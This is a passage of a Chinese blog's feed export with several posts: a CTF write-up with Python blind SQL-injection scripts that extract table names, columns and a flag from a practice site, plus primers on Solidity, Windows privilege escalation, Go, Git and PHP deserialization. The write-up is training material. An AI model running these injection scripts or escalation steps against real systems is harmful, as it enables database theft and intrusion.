class="hljs-string">&quot;(ord(substr((select(group_concat(table_name))from(information_schema.columns)where(table_schema=&#x27;geek&#x27;)),%d,1))=%d)&quot;</span>%(i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439458.png" alt="image-20240303224502079"></p><p>然后爆出上面四个表名</p><p>再去爆一下字段名看看</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br>name1=<span class="hljs-string">&quot;F1naI1y&quot;</span><br>name2=<span class="hljs-string">&quot;FnaI1y,&quot;</span><br>name3=<span class="hljs-string">&quot;Fa1y&quot;</span><br>name4=<span class="hljs-string">&quot;Flaaag&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;%s&#x27;)),%d,1))=%d)&quot;</span>%(name1,i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>这个Flaaag里面没有东西，然后去爆name2，出了下面三个字段名</p><p><img src="http://cdn.clown2024.cn/202407151439459.png" alt="image-20240303225537909"></p><p>不过到后面连接超时了，不管了不想爆了()，总之在password这个字段</p><p>然后去爆password字段的值拿flag，这里用正则匹配来直接获取含有flag的数据来爆节省时间</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br>name1=<span class="hljs-string">&quot;F1naI1y&quot;</span><br>name2=<span class="hljs-string">&quot;FnaI1y,&quot;</span><br>name3=<span class="hljs-string">&quot;Fa1y&quot;</span><br>name4=<span class="hljs-string">&quot;Flaaag&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>,<span class="hljs-number">80</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">f&quot;(ord(substr((select(group_concat(password))from(F1naI1y)where((password)regexp&#x27;flag&#x27;)),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;j&#125;</span>)&quot;</span><br>        response=requests.get(url=url+sql,timeout=<span class="hljs-number">3</span>)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439460.png" alt="image-20240303234305001"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BC入门</title>
      <link href="/2024/02/29/BC%E5%85%A5%E9%97%A8/"/>
      <url>/2024/02/29/BC%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1><span id="智能合约入门">智能合约入门</span></h1><h2><span id="第一个合约">第一个合约</span></h2><p>这是一个计数器智能合约的实例：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">pragma solidity &gt;=<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;<span class="hljs-comment">//声明编译器版本</span><br><span class="hljs-comment">//类似的表示还有</span><br><span class="hljs-comment">//pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="hljs-comment">//pragma solidity ^0.8.0;</span><br><br><span class="hljs-comment">// 定义一个合约</span><br>contract <span class="hljs-title class_">Counter</span> &#123;<br>    uint public counter;<br>    <br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>        counter = <span class="hljs-number">0</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">count</span>(<span class="hljs-params"></span>) public &#123;<br>        counter = counter + <span class="hljs-number">1</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) public view returns (uint) &#123;<br>        <span class="hljs-keyword">return</span> counter;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>合约是可部署到区块链的最小单元， 一个合约通常由<strong>状态变量（合约数据）</strong>和<strong>合约函数</strong>组成。</p><h2><span id="变量和函数">变量和函数</span></h2><p><strong>控制可见性的关键词</strong></p><p><code>public</code> 类型的状态变量，会自动创建一个同名的外部函数（称为访问器），来获取状态变量的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">比如：<br>uint public a;<br>部署的时候就会有一个a()函数来获取a的值<br></code></pre></td></tr></table></figure><table><thead><tr><th></th><th>public</th><th>external</th><th>internal</th><th>private</th></tr></thead><tbody><tr><td>修饰函数</td><td>✔️</td><td>✔️</td><td>✔️</td><td>✔️</td></tr><tr><td>修饰变量</td><td>✔️</td><td></td><td>✔️</td><td>✔️</td></tr><tr><td>当前合约内可访问</td><td>✔️</td><td></td><td>✔️</td><td>✔️</td></tr><tr><td>派生合约可访问</td><td>✔️</td><td></td><td>✔️</td><td></td></tr><tr><td>外部访问</td><td>✔️</td><td>✔️</td><td></td><td></td></tr></tbody></table><p><strong>常量和不可变量</strong></p><ul><li><p>constant：在合约里可以定义常量，使用 <code>constant</code> 来声明一个常量，常量不占用合约的存储空间，而是在编译时使用对应的表达式值替换常量名。</p><p>使用<code>constant</code>修饰的状态变量，只能使用在编译时有确定值的表达式来给变量赋值。</p><p>因此任何通过访问存储数据、区块链数据（如<code>now</code>、<code>address(this).balance</code>或者<code>block.number</code>）或执行数据（<code>msg.value</code>或<code>gasleft()</code>）或对外部合约的调用来给它们赋值都是不允许的（因为它们的值无法在编译期确定）。</p><p>不过对于内建函数，如<code>keccak256</code>、<code>sha256</code>、<code>ripemd160</code>、<code>ecrecover</code>、<code>addmod</code>和<code>mulmod</code>，是允许的（尽管它们调用的是外部预编译合约），如这句代码就是合法的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs solidity">bytes32 constant myHash = keccak256(&quot;abc&quot;);<br></code></pre></td></tr></table></figure></li><li><p>immutable： Solidity 中使用 <code>immutable</code> 来定义一个不可变量，<code>immutable</code>不可变量同样不会占用状态变量存储空间，在部署时，变量的值会被追加的运行时字节码中，因此它比使用状态变量便宜的多，同样带来了更多的安全性</p><p>不可变量在构造函数中进行赋值，构造函数是在部署的时候执行，因此这是运行时赋值。</p></li></ul><p><strong>定义函数</strong></p><p>定义函数使用function关键字，且函数可以有多个返回值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs solidit">pragma solidity &gt;0.5.0;<br>contract C &#123;<br>    function f() public pure returns (uint, bool, uint) &#123;<br>        return (7, true, 2);<br>    &#125;<br>     function g() public &#123;<br>        // 获取返回值<br>        (uint x, bool b, uint y) = f();<br>     &#125;    <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>状态可变性</strong></p><p>形容函数的可变性有 3 个关键字：</p><ul><li>view：用 view 修饰的函数，称为视图函数，它只能读取状态，而不能修改状态。</li><li>pure：用 pure 修饰的函数，称为纯函数，它既不能读取也不能修改状态。</li><li>payable：用 payable 修饰的函数表示可以接受以太币，如果未指定，该函数将自动拒绝所有发送给它的以太币。</li></ul><blockquote><p><code>view</code> , <code>pure</code> , <code>payable</code> 通常被称为修饰符</p></blockquote><h2><span id="数据类型">数据类型</span></h2><p>数据类型分为一下三种：</p><ul><li>值类型（Value Types）</li><li>引用类型（Reference Types）</li><li>映射类型（Mapping Types）</li></ul><p><strong>引用类型</strong></p><p>引用类型包括<strong>数组</strong> 和<strong>结构体</strong>。</p><p>在定义引用类型时，有一个额外属性来标识数据的存储位置，这个属性有：</p><ul><li>memory（内存）： 变量在运行时存在，其生命周期只存在于函数调用期间。</li><li>storage（存储）：保存状态变量，只要合约存在就一直保存在区块链中。</li><li>calldata（调用数据）：用来存储函数参数的特殊数据位置，用来接收外部数据，是一个不可修改的、非持久的函数参数存储区域。</li></ul><p><strong>映射类型</strong></p><p>映射类型和Java的Map、Python的Dict在功能上差不多，它是一种键值对的映射关系存储结构，定义方式为mapping(KT &#x3D;&gt; KV)。</p><h2><span id="地址类型">地址类型</span></h2><h1><span id="ethernaut">Ethernaut</span></h1><p>这里通过该靶场来学习只能合约安全，先从<strong>Hello Ethernaut</strong>看起</p><h2><span id="hello-ethernaut">Hello Ethernaut</span></h2>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF BC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 提权</title>
      <link href="/2024/02/29/Windows-%E6%8F%90%E6%9D%83/"/>
      <url>/2024/02/29/Windows-%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1><span id="windows权限划分">Windows权限划分</span></h1><p>在Windows中，有User、Administrator、System、TrustedInstaller这四种用户权限，其权限从左到右依次升高。</p><p>权限提升分为下面两类：</p><ul><li>纵向提取：低权限用户获得高权限用户的权限</li><li>横向提权：获得同级别角色的权限</li></ul><p><strong>常用提权方法</strong></p><ul><li>Windows系统内核溢出漏洞提权</li><li>错误系统配置提权</li><li>数据库提权</li><li>等等~</li></ul><h1><span id="windows系统内核溢出漏洞提权">Windows系统内核溢出漏洞提权</span></h1><p>溢出漏洞是一种计算机程序的可更正性缺陷。溢出漏洞的全名:缓冲区溢出漏洞。因为它是在程序执行的也是攻击者时候在缓冲区执行的错误代码，所以叫缓冲区溢出漏洞。缓冲溢出是最常见的内存错误之一，入侵系统时所用到的最强大、最经典的一类漏洞利用方式。成功地利用缓冲区溢出漏洞可!修改内存中变量的值，甚至可以劫持进程，执行恶意代码，最终获得主机的控制权。利用Windows系统内核溢出漏洞提权是一种很通用的提权方法，攻击者通常可以使用该方法绕过系统中的所有安全限制。攻击者利用该漏洞的关键是目标系统有没有及时安装补丁，如果目标系统没有安装某一漏洞的补丁且存在该漏洞的话，攻击者就会向目标系统上传本地溢出程序，溢出Administrator权限。</p><h2><span id="手动查看系统漏洞">手动查看系统漏洞</span></h2><p>获得一个普通用户的shell之后，我们可以用一些命令来查看系统有哪些补丁</p><ol><li><p>systeminfo</p><p><img src="http://cdn.clown2024.cn/202407151445483.png" alt="image-20240229111338484"></p></li><li><p>wmic qfe get caption,description,hotfixid,installedon</p><p><img src="http://cdn.clown2024.cn/202407151445485.png" alt="image-20240229111417594"></p></li></ol><h2><span id="提权辅助工具">提权辅助工具</span></h2><ol><li><p><strong>使用Windows-Exploit-Suggester解析systeminfo</strong>：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p><p>该工具可以解析systeminfo出来的数据看是否存在漏洞</p><p>使用步骤：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./windows-exploit-suggester.py --update  #用来更新漏洞库<br>pip install xlrd --upgrade  #如果没有该依赖可以进行安装<br>./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt  #提供我们保存的systeminfo输出的文本文件，然后指向微软数据库<br></code></pre></td></tr></table></figure></li><li><p>Windows提权漏洞合集：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p></li><li><p>各大平台提权工具：<a href="https://github.com/klsfct/getshell">https://github.com/klsfct/getshell</a></p></li></ol><h1><span id="系统权限配置错误">系统权限配置错误</span></h1>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go get小坑</title>
      <link href="/2024/02/27/go-get%E5%B0%8F%E5%9D%91/"/>
      <url>/2024/02/27/go-get%E5%B0%8F%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h1><span id="gin框架安装">gin框架安装</span></h1><p>尝试本地去跑一个go项目时，在导入包时提示找不到路径找不到对应的包</p><p>先用下列命令开启了环境变量GO111MODULE&#x3D;on，不然go get不了</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">go env -w GO111MODULE=on<br></code></pre></td></tr></table></figure><p>然后get相应的包</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">go get -u github.com/chromedp/chromedp<br>go get -u github.com/gin-gonic/gin<br>go get -u golang.org/x/net/html<br></code></pre></td></tr></table></figure><p>再go build源码时就出现了下面的错误</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">main.go:13:2: cannot find package &quot;github.com/chromedp/chromedp&quot; in any of: D:\go\src\github.com\chromedp\chromedp (from $GOROOT) C:\Users\86189\go\src\github.com\chromedp\chromedp (from $GOPATH)<br></code></pre></td></tr></table></figure><h1><span id="查看环境变量">查看环境变量</span></h1><p>用下面命令查看go环境变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">go env<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440880.png" alt="image-20240227171305349"></p><p>发现gopath没有指向我安装时设置的环境变量，去环境变量设置的地方查看一下<img src="http://cdn.clown2024.cn/202407151509348.png" alt="image-20240227171421124"></p><p>会发现用户变量还有一个gopath指向默认的地方，删掉即可</p><p>现在再使用go env查看一下，发现成功修改</p><p><img src="http://cdn.clown2024.cn/202407151440882.png" alt="image-20240227171518116"></p><p>然后再去重新get一遍即可</p><blockquote><p>开启了环境变量GO111MODULE&#x3D;on，会将go get的文件下载到GOPATH&#x2F;pkg&#x2F;mod里</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git学习</title>
      <link href="/2024/01/25/git%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/01/25/git%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1><span id="git学习">Git学习</span></h1><p>这里还有一个很好的总结网站：<a href="https://mp.weixin.qq.com/s/Q_O0ey4C9tryPZaZeJocbA">https://mp.weixin.qq.com/s/Q_O0ey4C9tryPZaZeJocbA</a></p><h2><span id="概述">概述</span></h2><ol><li>git在实际开发中的运用场景非常多，比如：备份，代码还原，协同开发，追溯问题代码的编写人和时间。</li></ol><p>&#x3D;&#x3D;版本控制器的方式&#x3D;&#x3D;</p><blockquote><p>a.集中式版本控制工具，比如：svn，cvs</p><p>b.分布式版本控制工具，比如：git</p><p>二者的差别很大，集中式中，版本库是存放在中央服务器中的，需要的代码都是提交到中央服务器或从中央服务器下载；分布式中则没有中央服务器，会有一个共享服务器，每台电脑都有自己的本地仓库存放着自己的一个完整的版本库。</p></blockquote><h2><span id="git的配置">git的配置</span></h2><p>&#x3D;&#x3D;设置用户信息&#x3D;&#x3D;</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E9%85%8D%E7%BD%AE.png"></p><blockquote><p>当不跟设置信息的名称时就是查询用户的信息</p></blockquote><h2><span id="给常用命令设置一个别名">给常用命令设置一个别名</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建一个.bashrc文件，在里面设置别名</span><br><span class="hljs-built_in">touch</span> ~/.bashrc<br>vim .bashrc<br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E8%AE%BE%E7%BD%AE%E5%88%AB%E5%90%8D.png"></p><h2><span id="获取本地仓库">获取本地仓库</span></h2><ol><li>新建一个目录作为本地仓库，这里直接在桌面建一个git_test目录</li><li>用 git init 初始化本地仓库<img src="https://gitee.com/ljc0033/magic/raw/master/%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93.png"></li></ol><p>​         能看到.git文件就成功了</p><h2><span id="git的常用命令">git的常用命令</span></h2><p>Git工作目录下对于文件的修改会存在几个状态(除了.git目录的都叫工作目录)</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E5%B7%A5%E4%BD%9C%E7%8A%B6%E6%80%81.png"></p><p>接下来新建一个file01.txt文件来进行测试命令，用touch指令</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看git状态</span><br>git status<br><span class="hljs-comment">#添加到缓存区</span><br>git add file01.txt        <span class="hljs-comment">#也可以用.通配符，表示添加所有</span><br><span class="hljs-comment">#提交到仓库</span><br>git commit -m <span class="hljs-string">&quot;注释&quot;</span><br><span class="hljs-comment">#查看历史日志</span><br>git <span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E5%B7%A5%E4%BD%9C%E7%8A%B6%E6%80%81%E6%94%B9%E5%8F%98.png"></p><blockquote><p>git log [option]还有更多的参数，这里详细列出来</p><ul><li>–all  显示所有分支</li><li>–pretty&#x3D;oneline   将提交信息显示为一行</li><li>–abbrev-commit  使得输出的commitid更简短</li><li>–graph     以图的形式显示</li></ul></blockquote><p>&#x3D;&#x3D;版本回退&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git reset --hard commitID<br><span class="hljs-comment">#查看已经删除的记录</span><br>git reflog     <span class="hljs-comment">#这个可以查看所有操作记录</span><br></code></pre></td></tr></table></figure><blockquote><p>commitID可以用git log查看</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151440099.png"></p><p>&#x3D;&#x3D;添加文件至忽略&#x3D;&#x3D;</p><p>有些文件我们不需要git管理，可以将他们添加到gitignore文件中即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> .gitignore<br></code></pre></td></tr></table></figure><p>一些示例<img src="http://cdn.clown2024.cn/202407151440100.png"></p><h2><span id="git分支">git分支</span></h2><p>几乎所有的版本控制系统都以某种形式支持分支。 使用分支意味着你可以把你的工作从开发主线上分离开来， 以免影响开发主线。</p><ul><li><p>常用分支相关命令</p><ul><li><p>查看本地分支</p><p>git branch</p></li><li><p>创建本地分支</p><p>git branch 分支名</p></li><li><p>切换分支</p><p>git checkout 分支名</p><p>git checkout -b 分支名  (直接切换到一个不存在的分支并创建该分支)</p></li><li><p>合并分支</p><p>一个分支上的提交可以合并到另一个分支</p><p>git merge 分支名称</p><blockquote><p>比如dev分支要合并到master需要先切换到master主线，再get merge dev</p></blockquote></li><li><p>删除分支</p><p><strong>不能删除当前分支，只能删除其他分支</strong></p><p>git branch -d b1  删除分支时，需要做各种检查</p><p>git branch -D b1 不做任何检查，强制删除</p></li></ul></li></ul><h2><span id="git远程仓库">git远程仓库</span></h2><p>这是一个总结的工作流程图：<img src="http://cdn.clown2024.cn/202407151440101.png" alt="image-20240123132413459"></p><h3><span id="使用ssh绑定gitee">使用ssh绑定gitee</span></h3><ol><li><p>用git来绑定gitee：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//生成ssh公钥，可以使用-f参数指定生成的文件名，比如：-f &quot;id_rsa_gitee&quot;<br>ssh-keygen -t rsa//生成的ssh密钥会默认在~/.ssh下面，如果生成过了也会直接覆盖，所以有多个密钥时要记得备份(在Windows的c盘用户目录下可以找到)<br></code></pre></td></tr></table></figure></li><li><p>Gitee设置公钥</p><p>将~&#x2F;.ssh下的id_rsa.pub公钥复制到下面的地方</p><p><img src="http://cdn.clown2024.cn/202407151440102.png" alt="image-20240125154416297"></p></li><li><p>绑定之后可以去验证ssh能否连接到gitee，这里选择用在~&#x2F;.ssh下新建一个config文件来配置，这样可以连接gitee也行、github也行，参考这篇文章：<a href="https://blog.csdn.net/weixin_40402743/article/details/124484633">https://blog.csdn.net/weixin_40402743/article/details/124484633</a></p><p><img src="http://cdn.clown2024.cn/202407151440103.png" alt="image-20240125170039569"></p><p>config文件中的配置如下，我配github的时候配置了邮箱，gitee则没有</p><p><img src="http://cdn.clown2024.cn/202407151440104.png" alt="image-20240125170137353"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#github<br>Host github.com<br>User &lt;生成密钥时指定的邮箱邮箱&gt;<br>Hostname ssh.github.com<br>PreferredAuthentications publickey<br>IdentityFile ~/.ssh/id_rsa_github<br>Port 443<br><br>#gitee<br>Host gitee.com<br>HostName gitee.com<br>PreferredAuthentications publickey<br>IdentityFile ~/.ssh/id_rsa_gitee<br></code></pre></td></tr></table></figure><p>使用<strong>ssh -T <a href="mailto:&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#x74;&#x65;&#x65;&#46;&#99;&#x6f;&#109;">&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#x74;&#x65;&#x65;&#46;&#99;&#x6f;&#109;</a></strong>验证<img src="http://cdn.clown2024.cn/202407151440105.png" alt="image-20240125170434757"></p></li></ol><h3><span id="远程仓库操作">远程仓库操作</span></h3><p><strong>添加远程仓库</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git remote add &lt;起的名字&gt; &lt;仓库地址&gt;<br>//git remote 可以查看当前的远程仓库<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440106.png" alt="image-20240125174304783"></p><p><strong>推送远程仓库</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git push &lt;自己命名的名称&gt; &lt;分支&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440107.png" alt="image-20240125180131766"></p><p>这是远程推送的完整指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">git push [-f] [--set-upstream] [远端名称 [本地分支名]:[远端分支名]]#如果本地和远端分支名一致就可以省略一个，像上面一样<br></code></pre></td></tr></table></figure><ul><li><p>-f表示强制推送，和远端代码修改同一块地方时可能会出现冲突。</p></li><li><p>–set-upstream：推送到远端的同时并且建立和远端分支的关联关系，这样当当前分支已经和远端分支关联时，则可以省略分支名和远端名<img src="http://cdn.clown2024.cn/202407151440108.png" alt="image-20240125182248016"></p><p><img src="http://cdn.clown2024.cn/202407151440109.png" alt="image-20240125183254456"></p></li></ul><p><strong>克隆远程仓库</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">git clone &lt;仓库路径&gt; [本地目录]<br></code></pre></td></tr></table></figure><p>如果没有指定目录的话，就会创建一个默认目录，比如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">git@gitee.com:ljc0033/git_test.git<br></code></pre></td></tr></table></figure><p>就会取git_test作为目录名</p><p><strong>抓取和拉取</strong></p><ul><li><p>抓取指令：git fetch [remote name] [branch name]</p><p>抓取就是将仓库里的更新都抓取到本地，不会进行合并</p><p>如果不指定远端名称和分支名，则抓取所有分支</p></li><li><p>拉取命令：git pull [remote name] [branch name]</p><p>拉取就是将远端仓库的修改拉到本地并自动进行合并，等同于fetch+merge</p><p>如果不指定远端名称和分支名，则抓取所有并更新当前分支</p></li></ul><p><img src="http://cdn.clown2024.cn/202407151440110.png" alt="image-20240125213127428"></p><p>这里可以看到fetch之后的分支并没有合并到当前的master，接下来再进行 git merge origin&#x2F;master<img src="http://cdn.clown2024.cn/202407151440111.png" alt="image-20240125213243273"></p><p>可以看到成功合并了(这里可以写上分支名)，git pull就相当于合并了这两步</p><h3><span id="解决冲突">解决冲突</span></h3><p>当A和B修改同一个文件时会出现冲突，这里模拟一下同时修改file01.txt文件，其中一个先提交<img src="http://cdn.clown2024.cn/202407151440112.png" alt="image-20240125214924391"></p><p><img src="http://cdn.clown2024.cn/202407151440113.png" alt="image-20240125215448663"></p><p>这里可以看到右边想要进行合并出现了冲突，因为修改了同一块地方，再看一下file01.txt的内容<img src="http://cdn.clown2024.cn/202407151440114.png" alt="image-20240125215616774"></p><p>上面的是我们当前分支，下面的是远端分支，我们只需要在本地把他修改我们想要的样子然后提交再合并就可以了，比如这样<img src="http://cdn.clown2024.cn/202407151440115.png" alt="image-20240125215801079"></p><p><img src="http://cdn.clown2024.cn/202407151440116.png" alt="image-20240125215928798"></p><h2><span id="git绑定github账号">git绑定GitHub账号</span></h2><ol><li><pre><code>git config --global --list  //查看自己的用户名和邮箱，注意要和github保持一致//如果不一致则自己去设置<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"><br>2. ```<br>   ssh-keygen -t rsa -C &quot;自己的邮箱&quot;//这里生成ssh的密钥，会默认在~/.ssh目录下面<br></code></pre></td></tr></table></figure>可以看到有下列文件：![image-20231103174934422](http://cdn.clown2024.cn/202407151440117.png)</code></pre></li><li><p>回到github仓库添加密钥</p></li></ol><p><img src="http://cdn.clown2024.cn/202407151440118.png" alt="image-20231103175102389"></p><p>然后复制.ssh下面的.pub公钥到下面的key中<img src="http://cdn.clown2024.cn/202407151440119.png" alt="image-20231103175214763"></p><ol start="4"><li><pre><code>ssh -T git@github.com //测试是否连通</code></pre><p>出现下面的结果即代表成功<img src="http://cdn.clown2024.cn/202407151440120.png" alt="image-20231103175607799"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2023/11/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/11/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>记录一下反序列化相关的函数</p><p>这篇文章蛮好的：<a href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的） | spaceman’blog (gitee.io)</a></p><p><strong>常见的魔术方法</strong></p><ul><li><p>__construct() :当对象被创建时触发</p></li><li><p>__destruct() :当对象被销毁时触发</p></li><li><p>__toString() :当对象被当作一个字符串使用时触发</p></li><li><p>__sleep() :序列化对象前调用（其返回需要是一个数组）</p></li><li><p>__wakeup() :反序列化恢复对象前调用，当字符串表示的对象属性个数大于真实个数时会跳过该函数执行</p></li><li><p>__call() :当调用对象不存在的方法时自动调用</p></li><li><p>__get() :从不可访问的属性读取数据时调用,或者不存在的属性</p></li><li><p>__invoke() :把一个实例对象当作函数使用时被调用</p></li><li><p>__clone() : 进行对象clone时被调用，用来调整对象的克隆行为</p></li><li><p>__callStatic() :调用不可访问或不存在的静态方法时自动调用</p></li><li><p>__isset() :在不可访问的属性上调用 isset() 或 empty() 时触发</p></li><li><p>__set() :当给不可访问或不存在属性赋值时被调用</p></li><li><p>__unset() :在不可访问的属性上使用 unset() 时触发</p></li><li><p>__ set_state() :</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">当调用 var_export() 导出类时，此静态方法被调用。用 __set_state() 的返回值做为 var_export() 的返回值<br></code></pre></td></tr></table></figure></li><li><p>__debuginfo() :当调用 var_dump() 打印对象时被调用（当你不想打印所有属性），适用于PHP5.6版本</p></li></ul><p><strong>php代码执行有关的函数</strong></p><ul><li><p>eval()函数：会将字符串当作php代码执行，需要以分号结尾，但比较特殊的是它不能被当作变量执行，例如：$a(“phpinfo();”),a为’eval’；这样子会报函数未定义的错误。</p><p>这里去了解一下发现：eval是因为是一个语言构造器而不是一个函数，不能被可变函数调用。</p><blockquote><p>可变函数即变量名加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。如果没有就报错。<br>可变函数不能用于例如：echo，print，unset()，isset()，empty()，include，require eval() 